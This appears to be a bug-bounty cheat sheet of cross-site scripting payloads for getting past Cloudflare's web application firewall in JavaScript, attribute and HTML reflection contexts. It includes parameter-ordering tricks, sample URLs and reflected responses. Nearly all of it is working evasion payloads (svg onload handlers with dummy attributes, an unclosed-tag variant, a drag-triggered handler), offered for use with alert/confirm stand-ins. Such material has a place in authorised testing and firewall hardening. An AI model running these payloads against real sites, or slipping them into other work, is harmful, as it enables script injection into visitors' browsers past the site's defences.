# CloudFlare XSS bypasses in different contexts

### JS Context

For **JS** context, when multiple parameters are reflected inside **<script>** tag e.g:
```
<script>
something({"some/thing":{"key":[{"name":"PARAM2_REFLECTION1","age":"","country":"","address1":"PARAM1_REFLECTION2","id":"123"}]}});
</script>
```

Set value of parameter which is reflected first: `</script%20`

Set value of parameter which is reflected afterwards: `><svg/oni=on onload=confirm(2)>`

The parameter which is reflected first, should be placed at end of URL, like:

`https://example[.]com/some/endpoint?param1=%3E%3Csvg%2Foni%3Don%20onload%3Dconfirm(2)%3E&param2=</script%20`

If it is placed before like folllowing, Cloudflare WAF will trigger:

`https://example[.]com/some/endpoint?param2=</script%20&param1=%3E%3Csvg%2Foni%3Don%20onload%3Dconfirm(2)%3E`

Sample Response contents:
```
<script>
something({"some/thing":{"key":[{"name":"</script ","age":"","country":"","address1":"><svg/oni=on onload=confirm(2)>","id":"123"}]}});
</script>
```

### Attribute Context

For Attribute context use:
```
"><svg/oni=on onload=confirm(2)>
'><svg/oni=on onload=confirm(2)>
```

### HTML Context

* For HTML context use:

`<svg/oni=on onload=confirm(2)>` Credits for XSS bypass in HTML context: [Troll_13](https://twitter.com/Troll_13/status/1353713311972552709)

* When `>` is present somewhere after our payload in response page:

`<svg oni=on onload=alert(1)//` e.g reflected as `<svg oni=on onload=alert(1)//</h2>` (Crafted on `February 01, 2022`)

* When user input is reflected twice and `>` is disallowed for valid existent tags and `>` is not present in response body:

`><svg oni=on onload=alert(document.domain)//` will e.g get reflected as `Found ><svg oni=on onload=alert(document.domain)//{"><svg oni=on onload=alert(document.domain)\/\/":null}` and XSS will trigger.

* When `>` is not present after our payload anywhere in response body and at the same time when `>` is not allowed as its allowed in previous payloads, inexistent tag can be provided for xss:

`<o oni=on ondrag=alert(1)>Drag Me` e.g reflected as `<o oni=on ondrag=alert(1)>Drag Me no left angle bracket present here` -> then highlight text and drag it to trigger XSS (Crafted on `February 01, 2022`)


---

Bypasses tested on: `August 26, 2021` and `February 01, 2022`
